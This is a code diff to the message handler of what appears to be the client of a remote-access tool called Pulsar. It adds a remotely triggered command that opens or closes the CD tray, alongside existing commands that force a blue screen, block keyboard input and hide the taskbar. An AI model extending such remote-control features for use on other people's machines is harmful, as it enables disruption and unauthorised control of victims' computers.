@@ -16,8 +16,15 @@ namespace Pulsar.Client.Messages
         private SwapMouseButtons _swapMouseButtons = new SwapMouseButtons();
         private HideTaskbar _hideTaskbar = new HideTaskbar();
         private KeyboardInput _keyboardInput = new KeyboardInput();
+        private CDTray _cdTray = new CDTray(); // Added CD tray handler
 
-        public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons || message is DoHideTaskbar || message is DoChangeWallpaper || message is DoBlockKeyboardInput;
+        public bool CanExecute(IMessage message) =>
+            message is DoBSOD ||
+            message is DoSwapMouseButtons ||
+            message is DoHideTaskbar ||
+            message is DoChangeWallpaper ||
+            message is DoBlockKeyboardInput ||
+            message is DoCDTray; // Added support for DoCDTray
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -40,6 +47,22 @@ namespace Pulsar.Client.Messages
                 case DoBlockKeyboardInput msg:
                     Execute(sender, msg);
                     break;
+                case DoCDTray msg: // Added case for CD tray
+                    Execute(sender, msg);
+                    break;
+            }
+        }
+
+        private void Execute(ISender client, DoCDTray message) // Added method
+        {
+            try
+            {
+                _cdTray.Handle(message);
+                client.Send(new SetStatus { Message = $"CD tray {(message.Open ? "opened" : "closed")} successfully" });
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatus { Message = $"Failed to {(message.Open ? "open" : "close")} CD tray: {ex.Message}" });
             }
         }
 
@@ -165,7 +188,6 @@ namespace Pulsar.Client.Messages
             {
                 if (disposing)
                 {
-                    // Dispose managed resources
                     _keyboardInput?.Dispose();
                 }
                 _disposed = true;
